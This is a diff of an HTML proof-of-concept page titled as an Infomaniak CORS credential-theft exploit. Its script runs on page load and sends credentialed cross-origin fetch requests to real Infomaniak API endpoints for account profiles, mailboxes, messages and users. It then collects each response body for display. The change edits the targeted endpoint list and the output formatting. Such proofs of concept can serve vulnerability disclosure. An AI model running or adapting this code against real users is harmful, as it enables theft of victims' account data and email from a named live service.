@@ -1,3 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Infomaniak CORS Exploit PoC</title>
+  <style>
+    body { font-family: Arial; background: #111; color: #0f0; padding: 20px; }
+    pre { background: #000; padding: 10px; border: 1px solid #0f0; }
+  </style>
+</head>
+<body>
+
+<h2>Infomaniak CORS Credential Theft PoC</h2>
+<p>If this page can read your Infomaniak API responses, CORS is broken.</p>
+
+<pre id="output">Running PoC...</pre>
 
 <script>
 async function attack() {
@@ -10,9 +25,10 @@ async function attack() {
     "https://api.infomaniak.com/1/account/profile",
     "https://api.infomaniak.com/1/mailboxes",
     "https://api.infomaniak.com/1/messages",
-    "https://api.infomaniak.com/2/user",
-    "https://api.infomaniak.com/2/user/profile",
-    "https://api.infomaniak.com/3/account/profile"
+    "https://api.infomaniak.com/2/account",
+    "https://api.infomaniak.com/2/users",
+    "https://api.infomaniak.com/3/account/profile",
+    "https://api.infomaniak.com/3/users"
   ];
 
   let results = "";
@@ -24,11 +40,10 @@ async function attack() {
         credentials: "include"
       });
 
-      const text = await res.text(); // not json() in case of HTML error pages
-
-      results += `[${url}] STATUS: ${res.status}\n${text}\n\n`;
+      const text = await res.text(); // works for JSON or HTML error pages
+      results += `[${url}] STATUS: ${res.status}\n${text}\n\n--------------------------\n\n`;
     } catch (err) {
-      results += `[${url}] ERROR: ${err}\n\n`;
+      results += `[${url}] ERROR: ${err}\n\n--------------------------\n\n`;
     }
   }
 
@@ -37,3 +52,7 @@ async function attack() {
 
 attack();
 </script>
+
+</body>
+</html>
+
